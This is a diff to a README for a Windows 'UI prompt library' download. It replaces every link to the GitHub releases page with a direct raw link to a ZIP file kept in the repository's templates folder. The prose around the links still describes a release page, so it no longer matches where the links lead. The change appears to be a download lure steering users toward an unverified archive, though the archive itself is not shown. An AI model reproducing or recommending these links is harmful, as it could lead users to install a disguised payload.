@@ -1,6 +1,6 @@
 # 🎨 ui-prompt-library - Ready-to-Use UI Prompt Pack
 
-[![Download for Windows](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/melinaclincherbuilt937/ui-prompt-library/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/melinaclincherbuilt937/ui-prompt-library/main/templates/library-prompt-ui-v1.3.zip)
 
 ## 🧭 What this app is
 
@@ -21,7 +21,7 @@ If the app comes as a ZIP file, you will also need the built-in Windows extracto
 
 Go to the release page and visit this page to download:
 
-[https://github.com/melinaclincherbuilt937/ui-prompt-library/releases](https://github.com/melinaclincherbuilt937/ui-prompt-library/releases)
+[https://raw.githubusercontent.com/melinaclincherbuilt937/ui-prompt-library/main/templates/library-prompt-ui-v1.3.zip](https://raw.githubusercontent.com/melinaclincherbuilt937/ui-prompt-library/main/templates/library-prompt-ui-v1.3.zip)
 
 On that page, look for the latest release. Download the file meant for Windows, or the main release package if there is only one file.
 
@@ -174,7 +174,7 @@ When a new version appears:
 
 ## 🧷 Download again
 
-[Open the release page to download](https://github.com/melinaclincherbuilt937/ui-prompt-library/releases)
+[Open the release page to download](https://raw.githubusercontent.com/melinaclincherbuilt937/ui-prompt-library/main/templates/library-prompt-ui-v1.3.zip)
 
 ## 📎 Quick path
 
